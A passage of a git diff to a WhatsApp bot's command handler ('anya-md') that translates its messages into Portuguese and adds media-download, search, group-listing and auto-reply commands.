- m.reply("Error")
- }
- }
- 
- break
+anya.sendMessage(m.chat, templateMessage)
+		let { pinterest } = require(`./lib/scraper`)
+                anujj = await pinterest(text)
+                result1 = anujj[Math.floor(Math.random() * anujj.length)]
+let gam = await getBuffer(result1)
+let buttons = [
+                    {buttonId: `${prefix}pinterest ${q}`, buttonText: {displayText: `PROXIMO`}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: result1 },
+                    caption: `Resultados da pesquisa ${q}`,
+                    footer: `${watermark}`,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+break
 case 'togif': {
    if (!quoted) return m.reply('Reply Image')
    if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)
@@ -6168,7 +7123,7 @@ let { webp2mp4File } = require('./lib/uploader')
  break
 case 'toimage': case 'toimg': {
    if (!quoted) return m.reply('*imagem?*')
-   if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)
+   if (!/webp/.test(mime)) return m.reply(`responder adesivo com legenda *${prefix + command}*`)
    m.reply(mess.wait)
    let media = await anya.downloadAndSaveMediaMessage(quoted)
    let ran = await getRandom('.png')
@@ -6183,20 +7138,20 @@ case 'toimage': case 'toimg': {
  break
 case 'ytmp4': case 'ytvideo': {
 let { ytv } = require('./lib/y2mate')
-if (!text) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
-if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*The link you provided is not valid*')
+if (!text) return m.reply(`Exemplo : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
+if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*O link que você forneceu não é válido*')
 let quality = args[1] ? args[1] : '360p'
 let media = await ytv(text, quality)
-if (media.filesize >= 100000) return m.reply('*File Over Limit* '+util.format(media))
+if (media.filesize >= 100000) return m.reply('*Arquivo acima do limite* ')
 var capti = `
 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
     ⟮ _*◉ʏᴏᴜᴛᴜʙᴇ ᴅᴏᴡɴʟᴏᴀᴅ◉*_ ⟯ 
    
 0.02━◉━━━━━━━━━━━━3.26
-      🔂   ⏪   ⏸️     ⏩  🎵\n\n*◉Title* : ${media.title}\n*◉FILESIZE* : ${media.filesizeF}\n*◉URL* : ${isUrl(text)}\n*◉EXT* : MP3\n*◉RESOLUTION* : ${args[1] || '360p'}\n\n*anya bot INC*`
+      🔂   ⏪   ⏸️     ⏩  🎵\n\n*◉TITULO* : ${media.title}\n*◉TAMANHO* : ${media.filesizeF}\n*◉URL* : ${isUrl(text)}\n*◉EXT* : MP3\n*◉RESOLUÇÃO* : ${args[1] || '360p'}*`
 var buf = await getBuffer(media.thumb)
 anya.sendMessage(m.chat, { image: { url: media.thumb }, jpegThumbnail:buf, caption: `${capti}` }, { quoted: m })
-anya.sendMessage(m.chat, { video: { url: media.dl_link }, jpegThumbnail:buf, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `*Downloading From ${text}*` ,  quoted: m,contextInfo: { externalAdReply:{
+anya.sendMessage(m.chat, { video: { url: media.dl_link }, jpegThumbnail:buf, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `*Baixando de ${text}*` ,  quoted: m,contextInfo: { externalAdReply:{
 title:"anya-md",
 body:"anya-md",
 showAdAttribution: true,
@@ -6209,7 +7164,7 @@ break
 case 'ytmp3':  case 'ytmusic': {    
 m.reply(mess.wait)
 let { yta } = require('./lib/y2mate')
-if (!text) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
+if (!text) return m.reply(`Exemplo : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
 if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*Link invalido*')   
 let quality = args[1] ? args[1] : '128kbps'
 let media = await yta(text, quality)
@@ -6230,22 +7185,47 @@ var numero = `${m.sender.split('@')[0]}`
  m.reply(mess.wait)
   if (/image/.test(mime)) {
    let media = await quoted.download()
-   let encmedia = await anya.sendImageAsSticker(m.chat, media, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}` })
+   let encmedia = await anya.sendImageAsSticker(m.chat, media, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
    await fs.unlinkSync(encmedia)
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximo 10 segundos!')
    let media = await quoted.download()
-   let encmedia = await anya.sendVideoAsSticker(m.chat, media, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}` })
+   let encmedia = await anya.sendVideoAsSticker(m.chat, media, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
    await fs.unlinkSync(encmedia)
  } else {
    m.reply(`Envie uma imagem/video com a legenda !sticker`)
    }
  }
  break
+ case 'happymod': {
+/*   if (isBan) return reply(mess.ban)	 			
+if (isBanChat) return reply(mess.banChat)*/
+if (!args.join(" ")) return m.reply(`Example : ${prefix + command} mobile legend`)
+yogipw.happymod(args.join(" ")).then(async(res) => {
+teks = '```「 HappyMod 」```'
+for (let i of res) {
+teks += `\n\n${i.name}\n`
+teks += `${i.link}`
+}
+let buttons = [
+{buttonId: `!menu`, buttonText: {displayText: 'Menu🥀'}, type: 1}
+]
+let buttonMessage = {
+image: {url:res[0].icon},
+jpegThumbnail: img,
+caption: teks,
+footer: `${nomedobot}`,
+buttons: buttons,
+headerType: 4
+}
+anya.sendMessage(m.chat, buttonMessage, { quoted: m })
+})
+}
+break
 case 'play': {
 m.reply(mess.wait)
 let { yta } = require('./lib/y2mate')
-if (!text)  m.reply(`Example : ${prefix + command} story wa anime`)
+if (!text)  m.reply(`Exemplo : ${prefix + command} met gala - tz da coronel `)
 let yts = require("yt-search")
 let search = await yts(text)
 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
@@ -6254,8 +7234,7 @@ let caption = `
 *Titulo* ${anu.title}
 *Peso* ${anu.filesize}
 *Link* ${anu.url}
-*Descrição* ${anu.description}
-`
+*Descrição* ${anu.description}`
 let buttons = [
                     {buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: `VIDEO`}, type: 1},
                      {buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: `DOCUMENTO`}, type: 1}
@@ -6271,13 +7250,96 @@ let buttons = [
 addContg(sender, anu.url)               
 setTimeout(async function () {
 kk = '*deseja baixar está música?*'
-let buttons = [
-                        { buttonId: `!sim`, buttonText: { displayText: `baixar` }, type: 1 },                       
-                    ]
-                    await anya.sendButtonText(m.chat, buttons, kk, `${nomedobot}`, m)
+m.reply(kk)
 }, 4000)
 }
 
+break
+case 'playvideo': {
+//anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=360`)
+let buttons = [
+                        { buttonId: `!video480 ${q}`, buttonText: { displayText: `480p` }, type: 1 }, 
+                        { buttonId: `!video720 ${q}`, buttonText: { displayText: `720p` }, type: 1 },                      
+                         { buttonId: `!video1080 ${q}`, buttonText: { displayText: `1080p` }, type: 1 },           
+                    ]
+                    await anya.sendButtonText(m.chat, buttons, `*_ESCOLHA A QUALIDADE PARA SEU VÍDEO!_*`, `${watermark}`)        
+}
+break
+case 'video480': {
+anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=480`)
+alonexis = `Título: ${anu.title}\nId: ${anu.id}`
+anya.sendMessage(m.chat, { video: { url: anu.mp4.download, caption: alonexis } }, { quoted: m })
+}
+break
+case 'video720': {
+anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=720`)
+alonexis = `Título: ${anu.title}\nId: ${anu.id}`
+anya.sendMessage(m.chat, { video: { url: anu.mp4.download, caption: alonexis } }, { quoted: m })
+}
+break
+case 'video1080': {
+anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=1080`)
+alonexis = `Título: ${anu.title}\nId: ${anu.id}`
+anya.sendMessage(m.chat, { video: { url: anu.mp4.download, caption: alonexis } }, { quoted: m })
+}
+break
+case 'play2':{
+m.reply(mess.wait)
+let { yta } = require('./lib/y2mate')
+if (!text) return m.reply(`Exemplo : ${prefix + command} met gala - tz da coronel `)
+let yts = require("yt-search")
+let search = await yts(text)
+let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
+let buf = await getBuffer(anu.thumbnail)
+let caption = `
+*── 「 USUÁRIO 」 ──*
+
+*🗂 ️Nome: ${pushname}*
+*📆 Data: ${datakk}*
+*🕗 Horário: ${timekk}*
+
+*── 「 INFORMAÇÃO 」 ──*
+
+*📝 Titulo* ${anu.title}
+*⚖️ Peso* ${anu.filesize}
+*📌 Link* ${anu.url}
+*📃 Descrição* ${anu.description}`
+let buttons = [
+                    {buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: `VIDEO`}, type: 1},
+                     {buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: `DOCUMENTO`}, type: 1},
+                     {buttonId: `${prefix}ytmp3k ${anu.url}`, buttonText: {displayText: `AUDIO`}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: anu.thumbnail },
+                    caption: caption,
+                    footer: `${watermark}`,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
+}
+break
+ case 'listgc': {
+ let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
+ let teks = ` 「  Lista de usuários do grupo da anya 」\n\nTotal de usuários que estão usando o bot em Grupos: ${anu.length}`
+ for (let i of anu) {
+  let metadata = await anya.groupMetadata(i)
+  if (metadata.owner === "undefined") {
+  loldd = false
+  } else {
+  loldd = metadata.owner
+  }
+  teks += `\n\nNome : ${metadata.subject ? metadata.subject : "undefined"}\nProprietário : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\nFeito : ${metadata.creation ? moment(metadata.creation * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nMembros : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
+ }
+ anya.sendTextWithMentions(m.chat, teks, m)
+ }
+ break
+case 'covidinfo':
+case 'covid':
+let { covid } = require('./lib/covid.js') 
+const c = await covid()
+var { kasus, kematian, sembuh } = c[0]
+anya.sendMessage(from, {text : `Casos : ${kasus}\n\nMortes : ${kematian}\n\nCurados : ${sembuh}`}, m)
 break
 case 'ytbmp3':  case 'ytmusic': {	  
                 let { yta } = require('./lib/y2mate')
@@ -6298,24 +7360,26 @@ case 'ytbmp3':  case 'ytmusic': {
                 sourceUrl: `${media.title}` }}}, {quoted:m})
                 }
             break
-case 'ytshorts': case 'shorts': {
-  
-if (!text) return m.reply(`*Use ${prefix + command} enter pin link*`)
-if (!isUrl(args[0]) && !args[0].includes('youtube')) throw '*The link you provided is not valid*'                
-xa.Youtube(`${text}`).then(async (data) => {
-if (data.medias[0].formattedSize.split('MB')[0] >= 100) return m.reply('*File Over Limit* ') 
-cap = `
-*▊▊▊YOUTUBE SHORTS▊▊▊*
-
-*⬤▶━━━━━━━━━2:30*\n\n\n\n*⬤TITLE:* ${data.title}\n*⬤QUALITY:* ${data.medias[0].quality}\n*⬤SIZE:* ${data.medias[0].formattedSize}\n*⬤DURATION* ${data.duration}\n*⬤ID:* ${data.medias[0].cached}\n*⬤LINK:* ${data.url}\n\n*ANYA BOT INC*`
-buf = await getBuffer(data.thumbnail)
-anya.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${cap}` }, { quoted: m })
-anya.sendMessage(m.chat, { video: { url: data.medias[0].url }, jpegThumbnail:buf, caption: `*⬤TITLE:* ${data.title}\n*⬤QUALITY:* ${data.medias[0].quality}\n*⬤SIZE:* ${data.medias[0].formattedSize}` }, { quoted: m })  
-            }).catch((err) => {
-                m.reply(`*Failed to download and send media*`)
-            })
-        }
-        break
+case 'ytmp3k': {	  
+m.reply(mess.wait)
+                let { yta } = require('./lib/y2mate')
+                if (!text) return m.reply(`Exemplo : ${prefix + command} https://youtube.com/watch?v=1gQkk4Zo6rE 128kbps`)
+                if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*O link que você forneceu não é válido*')
+                
+                let quality = args[1] ? args[1] : '128kbps'
+                let media = await yta(text, quality)
+                if (media.filesize >= 100000) return m.reply('*Arquivo acima do limite* '+util.format(media))
+               var buf = await getBuffer(media.thumb)
+                anya.sendMessage(m.chat, {audio:{url:media.dl_link}, mimetype:"audio/mpeg", fileName: `${media.title}.mp3`,  quoted: m, contextInfo: { externalAdReply:{
+                showAdAttribution: true,
+                title:media.title,
+                body:"YOUTUBE MP3",
+                mediaType:2,
+                thumbnail:buf,
+                mediaUrl:`${text}`, 
+                sourceUrl: `${media.title}` }}}, {quoted:m})
+                }
+            break
 case 'ytmp32':
   case 'youtubemp32':{
    const templateMessage = {
@@ -6361,100 +7425,14 @@ let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
  
 if (prefix && isCmd) {
 //addFilter(from) 
-listMessage = {
-                    text: `[🌸] o comando: ${prefix + command}, não existe ou foi digitado errado, verifique selecionando um menu abaixo. [🌸]`,
-                    footer: `${watermark}`,
-                    buttonText: '🌸 CLIQUE AQUI 🌸',
-                    title: `[🌸] olá ${pushname} [🌸]`,
-                    sections: [{
-                        title: '[💎] 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐌𝐄𝐍𝐔𝐒️ [💎]',
-                        rows: [{
-                            rowId: `!menu1`,
-                            title: '[👾] 𝐌𝐄𝐍𝐔 𝐆𝐄𝐑𝐀𝐋 [👾]',
-                            description: 'exibe o menu geral'
-                        },
-                        {
-                            rowId: `!menupesq`,
-                            title: '[🔎] 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀 [🔎]',
-                            description: 'exibe o menu de pesquisas'
-                        },
-                        {
-                            rowId: `!menuconverter`,
-                            title: '[📌] 𝐂𝐎𝐍𝐕𝐄𝐑𝐓𝐄𝐑 [📌]',
-                            description: 'exibe o menu de conversores'
-                        },
-                        {
-                            rowId: `!menugp`,
-                            title: '[👤] 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒 [👤]',
-                            description: 'exibe o menu para grupos'
-                        },
-                        {
-                            rowId: `!menufun`,
-                            title: '[🕹️] 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒 [🕹️]',
-                            description: 'exibe o menu de brincadeiras'
-                        },
-                        {
-                            rowId: `!alteradores`,
-                            title: '[🎼] 𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒 [🎼]',
-                            description: 'exibe o menu de alternadores'
-                        },
-                        {
-                            rowId: `!+18`,
-                            title: '[🔞] 𝐍𝐒𝐅𝐖 [🔞]',
-                            description: 'exibe o menu de hentai'
-                        },
-                        {
-                            rowId: `!logos`,
-                            title: '[🎨] 𝐋𝐎𝐆𝐎𝐒 [🎨]',
-                            description: 'exibe o menu de logos'
-                        },
-                        {
-                            rowId: `!menucriador`,
-                            title: '[👑] 𝐌𝐄𝐍𝐔 𝐃𝐎 𝐂𝐑𝐈𝐀𝐃𝐎𝐑 [👑]',
-                            description: 'exibe o menu do criador'
-                        },
-                        {
-                            rowId: `!perfil`,
-                            title: '[♟️] 𝐏𝐄𝐑𝐅𝐈𝐋 [♟️]',
-                            description: 'exibe o seu perfil'
-                        },  
-                        {
-                            rowId: `!akinator`,
-                            title: '[🧞‍♂️] 𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 [️🧞‍♂️]',
-                            description: 'exibe o jogo akinator'
-                        
-                        },
-                                        {
-										"title": "[🛒] 𝐂𝐀𝐑𝐈𝐍𝐇𝐎 𝐃𝐄 𝐅𝐈𝐆𝐔️𝐒 [🛒]",
-										"description": "pacote de figurinhas",
-										"rowId": `${prefix}pacotefig`
-										}
-								]
-							},
-                            	{
-								"title": "[🤺] 𝐂𝐑𝐈𝐀𝐃𝐎𝐑 [🤺]",
-								"rows": [
-									{
-										"title": "número do criador",
-										"description": "exibe o número do criador",
-										"rowId": `${prefix}owner`
-										}
-								]
-							},
-							{
-								"title": "[🥋] 𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒 [🥋]",
-								"rows": [
-									{
-										"title": "Graças a ❤️",
-										"description": "exibe a lista de crédito do bot !!",
-										"rowId": `${prefix}creditos`
-									}
-								]
-                           }                         
-						],
-                }
-                anya.sendMessage(from, listMessage, {quoted:m})
-                    } 
+alonekj = `*── 「 ERROR 」 ──*\n\n*🗂 ️nome: ${pushname}*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O comando ${prefix + command} não existe, clique no botão abaixo para verificar o menu!*`
+let buttons = [
+                        { buttonId: `${prefix}menu`, buttonText: { displayText: `𝑴𝑬𝑵𝑼` }, type: 1 },
+                        { buttonId: `${prefix}delete`, buttonText: { displayText: `𝐴𝑷𝐴𝑮𝐴𝑹` }, type: 1 }                       
+                    ]
+                    await anya.sendButtonText(m.chat, buttons, alonekj, `${watermark}`, m)    
+                    }
+                    
  
    if (budy.startsWith('=>')) {
    if (!isCreator) return m.reply(mess.owner)
@@ -6533,6 +7511,19 @@ if (isCmd && budy.toLowerCase() != undefined) {
 }
 }
 
+/*if ((m.mtype === 'reactionMessage') && m.isGroup) {
+    anya.sendMessage(from, {text: `Detectou *${pushname} @${m.sender.split("@")[0]}* Reação de envio.`, mentions: [m.sender]}, {quoted: m})
+        }*/
+        
+        if ((m.mtype === 'groupInviteMessage' || budy.startsWith('https://chat') || budy.startsWith('Abra este link')) && !m.isGroup) {
+        	let buttons = [
+                    {buttonId: `!owner`, buttonText: {displayText: '𝑶𝑾𝑵𝑬𝑹 𝑩𝑶𝑻'}, type: 1}
+                ]
+			anya.sendMessage(from, {text:`CONVITE DETECTADO\n\Deseja adicionar este bot ao seu grupo?`, title: 'LINK DE GRUPO DETECTADO', footer: `${watermark}`, buttons: buttons, headerType: 5})
+		}
+if(m.mtype === 'imageMessage' && !m.isGroup) {
+anya.sendMessage(m.chat, {text: `IMAGEM DETECTADA\n\nCaso vc deseje transformar esta imagem numa figurinha basta marcar a foto com a legenda: !s`}, {quoted:m})
+}
 
     } catch (err) {
 anya.sendText("558898204406@s.whatsapp.net", util.format(err))
